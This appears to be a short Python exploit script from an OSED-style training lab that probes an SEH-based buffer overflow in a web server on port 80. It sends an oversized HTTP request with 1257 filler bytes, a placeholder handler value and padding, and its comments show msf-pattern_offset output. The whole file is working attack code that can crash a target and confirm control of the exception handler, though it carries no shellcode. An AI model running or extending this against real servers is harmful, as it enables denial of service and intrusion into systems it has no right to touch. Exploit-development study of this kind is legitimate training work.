#!/usr/bin/python
import sys
import struct
import socket

host = sys.argv[1]
port = 80

# Calculate the offset from buffer to the target __except_handler_ overwrite:

#┌──(root㉿kali)-[/home/kali/OSED/4-SEH/extramile2a]
#└─# msf-pattern_offset -l 2000 -q 42397042   

#[*] Exact match at offset 1257

#┌──(root㉿kali)-[/home/kali/OSED/4-SEH/extramile2a]
#└─# msf-pattern_offset -l 2000 -q 38704237
#[*] Exact match at offset 1253

def LE(num):
    return struct.pack('<I', num)


def send_exploit_request():

    size = 2000
    filler  = b"\x41" * 1257
    # Confirm that you can actually control the _Handler_ value - if true, it will be overwritten with `d34dc0d3`
    handler = LE(0xd34dc0d3) # we give this an address
    junk    = b'Z' * (size - len(filler + handler))
    buf = filler + handler + junk

    #HTTP Request
    request  = buf + b" / HTTP/1.0\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    print(s.recv(1024))
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
